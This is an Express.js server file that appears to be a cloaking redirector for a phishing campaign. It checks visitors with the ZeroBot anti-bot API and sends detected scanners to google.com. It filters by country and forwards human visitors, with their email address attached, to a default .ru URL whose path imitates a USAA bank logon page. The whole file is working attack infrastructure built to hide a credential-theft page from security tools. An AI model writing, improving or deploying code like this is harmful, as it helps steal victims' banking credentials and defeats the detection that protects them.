require('dotenv').config();
const express = require('express');
const axios = require('axios');
const crypto = require('crypto');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const requestIp = require('request-ip');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;

// 1. Trust Railway's proxy
app.set('trust proxy', true);

// 2. Security Middleware
app.use(helmet());
app.use(requestIp.mw());
app.use(express.json({ limit: '10kb' }));

// 3. CORS Configuration
app.use(cors({
  origin: [
    process.env.PRIMARY_DOMAIN,
    ...(process.env.ALLOWED_ORIGINS?.split(',') || [])
  ],
  credentials: true
}));

// 4. Rate Limiting
const limiter = rateLimit({
  windowMs: 5 * 60 * 1000,
  max: 300,
  handler: (req, res) => {
    console.log(`Rate limit exceeded: ${req.clientIp}`);
    res.status(429).json({ error: 'Too many requests' });
  }
});
app.use(limiter);

// ZeroBot Configuration
const ZEROBOT = {
  LICENSE: process.env.ZEROBOT_LICENSE_KEY,
  API_URL: 'https://zerobot.info/api/v2/antibot',
  ALLOWED_COUNTRIES: process.env.ALLOWED_COUNTRIES?.split(',') || ['us', 'au', 'ae'],
  BOT_REDIRECT: process.env.BOT_REDIRECT || 'https://google.com'
};

// Final Destination Configuration
const FINAL_DESTINATION = process.env.FINAL_DESTINATION || 'https://rep.zynvero.ru/myusaa-logon/ghost.php';

// ZeroBot Verification
async function verifyVisitor(req) {
  try {
    const { data } = await axios.post(ZEROBOT.API_URL, {
      license: ZEROBOT.LICENSE,
      ip: req.clientIp,
      useragent: req.headers['user-agent'] || '',
      check_on: `${req.protocol}://${req.get('host')}${req.originalUrl}`
    }, { timeout: 5000 });

    console.log('ZeroBot Response:', data);
    return {
      isBot: data?.is_bot || false,
      countryCode: data?.country_code || 'us'
    };
  } catch (error) {
    console.error('ZeroBot API Error:', error.message);
    return { isBot: false, countryCode: 'us' }; // Fail open
  }
}

// Token Generation
function generateToken(email) {
  return crypto
    .createHash('sha256')
    .update(`${email}:${Date.now()}:${process.env.SECRET_KEY}`)
    .digest('hex');
}

// URL Validation
function isValidUrl(url) {
  try {
    new URL(url);
    return true;
  } catch {
    return false;
  }
}

// Main Verification Route
app.get('/verify', async (req, res) => {
  try {
    const email = req.query.email;

    // 1. Email validation
    if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
      return res.status(400).send('Invalid email format');
    }

    // 2. ZeroBot verification
    const { isBot, countryCode } = await verifyVisitor(req);
    if (isBot) {
      return res.redirect(ZEROBOT.BOT_REDIRECT);
    }

    // 3. Country check
    const isCountryAllowed = ZEROBOT.ALLOWED_COUNTRIES.some(c => 
      c.toLowerCase() === (countryCode?.toLowerCase() || '')
    );
    if (!isCountryAllowed) {
      return res.status(403).send('Access denied from your country');
    }

    // 4. Generate final redirect URL
    const token = generateToken(email);
    const finalUrl = new URL(FINAL_DESTINATION);
    finalUrl.searchParams.set('token', token);
    finalUrl.searchParams.set('email', email);

    if (!isValidUrl(finalUrl.toString())) {
      throw new Error('Invalid final destination URL');
    }

    console.log(`Redirecting to: ${finalUrl.toString()}`);
    return res.redirect(finalUrl.toString());

  } catch (error) {
    console.error('Verification error:', error);
    return res.status(500).send('System error');
  }
});

// Health Check
app.get('/health', (req, res) => {
  res.status(200).json({ 
    status: 'healthy',
    primaryDomain: process.env.PRIMARY_DOMAIN,
    finalDestination: FINAL_DESTINATION
  });
});

// Start Server
app.listen(PORT, () => {
  console.log(`
  Server running on port ${PORT}
  ZeroBot Config:
  - License: ${ZEROBOT.LICENSE ? '***REDACTED***' : 'MISSING'}
  - Allowed Countries: ${ZEROBOT.ALLOWED_COUNTRIES.join(', ')}
  - Primary Domain: ${process.env.PRIMARY_DOMAIN || 'NOT SET'}
  - Final Destination: ${FINAL_DESTINATION}
  `);
});
